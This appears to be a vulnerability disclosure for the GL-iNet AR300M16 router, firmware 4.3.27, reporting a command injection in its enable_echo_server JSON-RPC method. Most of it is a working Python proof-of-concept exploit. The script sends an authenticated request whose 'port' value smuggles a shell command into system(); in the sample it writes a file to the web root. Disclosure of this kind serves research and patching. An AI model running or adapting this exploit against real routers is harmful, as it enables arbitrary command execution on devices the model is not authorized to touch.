Submittion Date: 2025.4.18  
Vendor: GL-AR300M16  
Version: 4.3.27   
Firmware: openwrt-ar300m16-4.3.27-0514-1747192506  
Download Link: https://dl.gl-inet.cn/router/ar300m16/stable  

The function enable_echo_server handles the critical parameter string port(sourced from parameter a1) without proper sanitization or validation, which leads to command injection​ and format string vulnerabilities. The user-controlled port input is directly embedded into multiple system commands through unsafe string operations and executed via system()calls, allowing attackers to execute arbitrary commands with elevated privileges.
![image](image/enable_echo_server_vuln1.png)
![image](image/enable_echo_server_vuln2.png)
Exploit the vulnerability by sending a carefully constructed HTTP request

```
import requests

# 目标URL (注意：URL中的/rpc需要根据实际情况调整)
url = "http://192.168.2.10/rpc"

# 请求头 (完全匹配Burpsuite中的headers)
headers = {
    "Host": "192.168.2.10",
    "Content-Length": "247",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Origin": "http://192.168.2.10",
    "Referer": "http://192.168.2.10/",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "Admin-Token=wb1H7fURGJM4dMpIsTQDZM50GNfgmqGd",
    "Connection": "keep-alive"
}

# 请求体 (JSON-RPC命令注入payload)
data = {
    "jsonrpc": "2.0",
    "method": "call",
     "params": [
        "wb1H7fURGJM4dMpIsTQDZM50GNfgmqGd",
        "s2s",
        "enable_echo_server",
        {
           "port": "7 $(echo 12345 >/www/1.txt)"
        }
    ]
}

# 发送POST请求
try:
    response = requests.post(
        url,
        headers=headers,
        json=data,
        verify=False  # 忽略SSL证书验证
    )
    
    # 输出响应信息
    print(f"Status Code: {response.status_code}")
    print("Response Headers:")
    print(response.headers)
    print("\nResponse Body:")
    print(response.text)
    
except requests.exceptions.RequestException as e:
    print(f"Request failed: {e}")
```
The exploitation is shown below.
![image](image/enable_echo_server_exploit.png)


